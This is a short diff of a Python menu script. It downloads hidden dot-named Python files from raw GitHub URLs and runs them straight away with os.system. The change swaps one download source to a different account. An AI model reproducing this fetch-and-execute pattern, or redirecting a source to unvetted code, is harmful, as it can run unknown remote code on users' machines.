@@ -249,7 +249,7 @@ def dwbara():
     	def solo():
     		wlat=input("  HALBZHERA DLM : ")
     		if wlat=="1":
-    			wget.download("https://raw.githubusercontent.com/zed404sfrr/3/main/.3.py")
+    			wget.download("https://raw.githubusercontent.com/matainsfr5sfr5sfro/5/main/.3.py")
     			os.system("python .3.py")
     		elif wlat=="2":
     			wget.download("https://raw.githubusercontent.com/zed404sfrr/3/main/.Saudi.py")
